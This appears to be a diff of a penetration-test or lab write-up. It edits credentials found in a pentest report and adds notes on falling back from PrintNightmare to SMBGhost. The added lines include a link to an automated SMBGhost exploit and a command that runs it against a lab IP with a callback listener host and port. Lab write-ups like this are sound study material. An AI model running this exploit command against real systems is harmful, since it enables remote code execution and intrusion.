@@ -37,7 +37,7 @@ login as anonymous and download the pentest report
 cat pentest_report.txt 
 // summary 
 
-- Exploitation successful with credentials test setset / t3st123
+- Exploitation successful with credentials test / t3st123
 - Vulnerability validated, PoC scanner was successful.
 
 // next steps
@@ -47,8 +47,12 @@ cat pentest_report.txt
 
 ```
 
+This should have been vulnerable to printnightmare but I could not get it to work, so I used SMBGhost
 
+https://github.com/Barriuso/SMBGhost_AutomateExploitation
 
-
+```
+./Smb_Ghost.py -i 10.10.110.20 --check -e --lhost 10.10.14.21 --lport 80
+```
 
 
